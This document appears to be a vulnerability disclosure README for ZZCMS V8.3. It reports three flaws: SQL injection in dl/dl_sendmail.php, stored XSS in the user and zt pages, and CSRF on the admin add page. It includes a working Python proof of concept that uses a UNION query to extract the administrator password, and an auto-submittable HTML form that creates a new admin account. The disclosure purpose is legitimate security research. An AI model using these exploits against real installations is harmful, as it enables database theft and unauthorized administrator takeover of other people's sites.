# ZZCMS V8.3

##1. SQL Injection
 
####dl/dl_sendmail.php
![image](https://github.com/AvaterXXX/ZZCMS/blob/master/1.png)
According to the code, the SQL statement is submitted as a post, and there is no filtering in the middle, so there is SQL injection here.

####POC：
'''
import requests

url = "http://10.10.10.39:8080/dl/dl_sendmail.php"
cookies = {'UserName':'admin','PassWord':'21232f297a57a5a743894a0e4a801fc3'}
data = { 'sql':'select email from zzcms_dl where id=-1 union select pass from zzcms_admin #'}

q = requests.post(url,data,cookies=cookies)
q.encoding = 'utf-8'
print q.text
'''
You can see that you have successfully obtained the administrator password.
![image](https://github.com/AvaterXXX/ZZCMS/blob/master/2.png)


##2. Stored XSS

####/user/manage.php
![image](https://github.com/AvaterXXX/ZZCMS/blob/master/3.png)
Keep going
####/zt/show.php
![image](https://github.com/AvaterXXX/ZZCMS/blob/master/4.png)
Stripfxg function is to restore the materialization. As you can see, there is a storage XSS vulnerability.

####Enter XSS
![image](https://github.com/AvaterXXX/ZZCMS/blob/master/5.png)
![image](https://github.com/AvaterXXX/ZZCMS/blob/master/6.png)


##3. CSRF
After the administrator logged in, open the following  page
poc：
'''
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.10.10.39:8080/admin/adminadd.php?action=add" method="POST">
      <input type="hidden" name="groupid" value="1" />
      <input type="hidden" name="admins" value="123" />
      <input type="hidden" name="passs" value="123" />
      <input type="hidden" name="passs2" value="123" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
'''
